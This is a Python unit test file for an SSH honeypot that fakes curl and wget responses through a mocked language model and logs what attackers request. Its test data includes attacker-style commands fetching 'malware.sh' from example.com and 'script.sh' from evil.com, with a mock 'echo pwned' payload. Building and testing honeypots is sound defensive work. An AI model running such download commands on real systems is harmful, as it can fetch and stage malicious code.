
import unittest
import os
import shutil
import sqlite3
import json
from unittest.mock import MagicMock
from ssh_honeypot.command_handler import CommandHandler
from ssh_honeypot.honey_db import HoneyDB

class TestNetworkIntelligence(unittest.TestCase):
    def setUp(self):
        self.test_db_path = "tests/test_honeypot.sqlite"
        if os.path.exists(self.test_db_path):
            os.remove(self.test_db_path)
            
        self.honey_db = HoneyDB(self.test_db_path)
        self.mock_llm = MagicMock()
        self.handler = CommandHandler(self.mock_llm, self.honey_db)
        self.context = {
            'session_id': 'test-session-123',
            'cwd': '/home/test',
            'ip': '1.2.3.4',
            'user': 'testuser'
        }

    def tearDown(self):
        if os.path.exists(self.test_db_path):
            os.remove(self.test_db_path)

    def test_curl_url_logging(self):
        self.mock_llm.generate_response.return_value = "<html>Mock Content</html>"
        
        url = "http://example.com/malware.sh"
        cmd = f"curl {url}"
        
        self.handler.handle_curl(cmd, self.context)
        
        # Verify DB Log
        conn = sqlite3.connect(self.test_db_path)
        c = conn.cursor()
        c.execute("SELECT url, method, user_agent FROM requested_urls WHERE session_id = ?", (self.context['session_id'],))
        row = c.fetchone()
        conn.close()
        
        self.assertIsNotNone(row)
        self.assertEqual(row[0], url)
        self.assertEqual(row[1], "GET")
        self.assertIn("curl", row[2])

    def test_wget_save_file(self):
        self.mock_llm.generate_response.return_value = "#!/bin/bash\necho pwned"
        
        url = "http://evil.com/script.sh"
        cmd = f"wget -O custom_script.sh {url}"
        
        output, _ = self.handler.handle_wget(cmd, self.context)
        
        # Verify File saved in User VFS
        node = self.honey_db.get_user_node(self.context['ip'], self.context['user'], '/home/test/custom_script.sh')
        self.assertIsNotNone(node)
        self.assertEqual(node['content'], "#!/bin/bash\necho pwned")
        self.assertIn("saved", output)

    def test_curl_head_request(self):
        self.mock_llm.generate_response.return_value = "HTTP/1.1 200 OK\nServer: Fake"
        
        url = "http://google.com"
        cmd = f"curl -I {url}"
        
        output, _ = self.handler.handle_curl(cmd, self.context)
        
        self.assertIn("HTTP/1.1 200 OK", output)
        
        # Verify DB Log shows HEAD
        conn = sqlite3.connect(self.test_db_path)
        c = conn.cursor()
        c.execute("SELECT method FROM requested_urls WHERE url = ?", (url,))
        row = c.fetchone()
        conn.close()
        
        self.assertEqual(row[0], "HEAD")

if __name__ == '__main__':
    unittest.main()
